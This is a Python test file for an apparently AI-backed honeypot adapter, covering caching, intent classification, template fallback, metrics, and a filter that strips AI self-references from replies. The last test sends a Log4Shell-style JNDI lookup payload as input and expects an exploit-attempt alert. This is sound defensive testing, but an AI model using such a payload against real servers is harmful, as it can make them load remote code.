"""End-to-end tests for the adapter (cache -> classifier -> chain)."""

from __future__ import annotations

import asyncio
from dataclasses import dataclass

from honeytrap.ai.adapter import ProtocolResponder
from honeytrap.ai.backends import ChainBackend, TemplateBackend
from honeytrap.ai.backends.base import ResponseBackend, ResponseRequest, ResponseResult
from honeytrap.ai.cache import ResponseCache
from honeytrap.ai.intent import IntentLabel
from honeytrap.ai.memory import SessionMemory
from honeytrap.ops.health import MetricsRegistry


def _run(coro):  # type: ignore[no-untyped-def]
    return asyncio.run(coro)


@dataclass
class _FakeBackend(ResponseBackend):
    """Configurable fake backend used by adapter tests."""

    name: str = "fake"
    response: str = ""
    shape_ok: bool = True

    async def generate(self, request: ResponseRequest) -> ResponseResult:  # type: ignore[override]
        return ResponseResult(
            content=self.response,
            latency_ms=0.5,
            backend_name=self.name,
            cached=False,
            shape_ok=self.shape_ok,
        )


def _mk_adapter(chain_backends=None, cache=True, enabled=True, metrics=None):  # type: ignore[no-untyped-def]
    chain = ChainBackend(chain_backends or [TemplateBackend()])
    return ProtocolResponder(
        chain=chain,
        cache=ResponseCache() if cache else None,
        enabled=enabled,
        metrics=metrics,
    )


def test_disabled_adapter_returns_empty() -> None:
    adapter = _mk_adapter(enabled=False)
    mem = SessionMemory(session_id="s", source_ip="1.2.3.4")
    result = _run(
        adapter.get_response(
            protocol="ssh",
            inbound="whoami",
            memory=mem,
        )
    )
    assert result.response == b""
    assert result.backend_used == "disabled"


def test_enabled_routes_through_chain_and_classifier() -> None:
    adapter = _mk_adapter()
    mem = SessionMemory(session_id="s1", source_ip="1.2.3.4")
    mem.command_history = ["whoami", "id"]
    result = _run(
        adapter.get_response(
            protocol="ssh",
            inbound="uname -a",
            memory=mem,
        )
    )
    assert result.response  # template always returns content
    assert result.backend_used == "template"
    assert mem.intent is not None
    # third command -> RECON signals
    assert mem.intent == IntentLabel.RECON


def test_shape_violating_llm_output_falls_back_to_template() -> None:
    bad = _FakeBackend(name="bad", response="no status line here", shape_ok=True)
    adapter = ProtocolResponder(
        chain=ChainBackend([bad, TemplateBackend()]),
        cache=None,
        enabled=True,
    )
    mem = SessionMemory(session_id="s-http", source_ip="1.2.3.4")
    result = _run(
        adapter.get_response(
            protocol="http",
            inbound="GET / HTTP/1.1",
            memory=mem,
        )
    )
    assert result.response.startswith(b"HTTP/1.1")
    assert result.backend_used == "template"


def test_safety_filter_catches_ai_self_reference() -> None:
    leaky = _FakeBackend(
        name="leaky",
        response="As an AI language model, I cannot help with that.",
        shape_ok=True,
    )
    adapter = ProtocolResponder(
        chain=ChainBackend([leaky, TemplateBackend()]),
        cache=None,
        enabled=True,
    )
    mem = SessionMemory(session_id="s-ssh", source_ip="1.2.3.4")
    result = _run(
        adapter.get_response(
            protocol="ssh",
            inbound="id",
            memory=mem,
        )
    )
    assert b"As an AI" not in result.response
    assert result.backend_used == "template"


def test_metrics_counters_updated() -> None:
    reg = MetricsRegistry()
    adapter = _mk_adapter(metrics=reg)
    mem = SessionMemory(session_id="s1", source_ip="1.2.3.4")
    _run(
        adapter.get_response(
            protocol="ssh",
            inbound="whoami",
            memory=mem,
        )
    )
    snap = reg.snapshot()
    counters = snap["counters"]
    assert any(name == "honeytrap_ai_intent_total" for (name, _lab) in counters)
    assert any(name == "honeytrap_ai_backend_used_total" for (name, _lab) in counters)
    assert "honeytrap_ai_cache_hit_ratio" in {k[0] for k in snap["gauges"]}


def test_cache_hit_flows_through() -> None:
    adapter = _mk_adapter()
    # Two separate sessions with identical state produce identical cache keys.
    mem_a = SessionMemory(session_id="s1", source_ip="1.2.3.4")
    mem_b = SessionMemory(session_id="s2", source_ip="1.2.3.4")
    _run(
        adapter.get_response(
            protocol="http",
            inbound="GET / HTTP/1.1",
            memory=mem_a,
        )
    )
    _run(
        adapter.get_response(
            protocol="http",
            inbound="GET / HTTP/1.1",
            memory=mem_b,
        )
    )
    assert adapter.cache is not None
    assert adapter.cache.stats.hits >= 1


def test_alert_callback_fires_on_high_severity_transition() -> None:
    triggered: list[str] = []

    def _cb(memory, intent, rationale):  # type: ignore[no-untyped-def]
        triggered.append(intent.value)

    adapter = ProtocolResponder(
        chain=ChainBackend([TemplateBackend()]),
        cache=None,
        enabled=True,
        alert_callback=_cb,
    )
    mem = SessionMemory(session_id="s-exploit", source_ip="1.2.3.4")
    _run(
        adapter.get_response(
            protocol="http",
            inbound="GET /?x=${jndi:ldap://x/y} HTTP/1.1",
            memory=mem,
        )
    )
    assert triggered == [IntentLabel.EXPLOIT_ATTEMPT.value]
